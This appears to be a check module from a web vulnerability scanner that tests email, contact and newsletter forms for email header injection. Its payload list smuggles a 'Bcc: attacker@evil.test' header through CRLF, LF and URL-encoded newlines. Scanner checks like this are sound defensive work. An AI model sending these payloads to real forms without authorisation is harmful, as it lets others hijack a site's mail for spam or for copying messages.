from __future__ import annotations

from icescan.checks.base import BaseCheck
from icescan.core.types import Finding, ScanContext, Surface, SurfaceKind, Severity
from icescan.core.surfaces import inject_into_form

PAYLOADS = [
    "test@x.com\r\nBcc: attacker@evil.test",
    "test@x.com\nBcc: attacker@evil.test",
    "test@x.com%0aBcc: attacker@evil.test",
]

FORM_HINTS = ["email", "mail", "contact", "subscribe", "newsletter", "invite"]


class EmailHeaderInjection(BaseCheck):
    name = "email_header"
    category = "injection"
    level = 3

    async def run_surface(self, ctx, surface):
        if surface.kind != SurfaceKind.BODY_FORM:
            return []
        fields = " ".join(surface.extra.get("all_fields", [])).lower()
        if not any(h in fields for h in FORM_HINTS):
            return []
        for payload in PAYLOADS:
            data = inject_into_form(surface.extra.get("all_fields", [surface.name]), surface.name, payload)
            r = await ctx.client.request(surface.method, surface.url, data=data)
            if r is None or r.error:
                continue
            body = (r.body or "").lower()
            if "invalid" not in body and r.status in (200, 302) and "bcc:" in body:
                return [self.finding(
                    severity=Severity.MEDIUM,
                    url=surface.url, method=surface.method, param=surface.name,
                    payload=payload,
                    evidence={"status": r.status},
                    confidence="low",
                )]
        return []
